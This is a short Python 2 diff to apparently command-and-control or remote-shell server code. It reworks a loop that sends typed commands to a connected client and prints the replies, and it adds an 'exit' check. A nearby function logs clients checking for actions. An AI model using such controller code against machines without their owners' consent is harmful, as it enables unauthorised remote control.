@@ -17,10 +17,15 @@ def open_shell_interpreter(conn):
 	cmd = ""
 	while True:
 		cmd = raw_input("> ")
-		try:
+		if cmd == "exit":
 			conn.send(cmd)
-		except:
 			break
+		else:
+			try:
+				conn.send(cmd)
+				print(conn.recv(1024))
+			except:
+				break
 
 def check_client_action(conn, data, data_processed):
 	print("[i] %s is checking for actions.." % data_processed['client_hashed_id'])
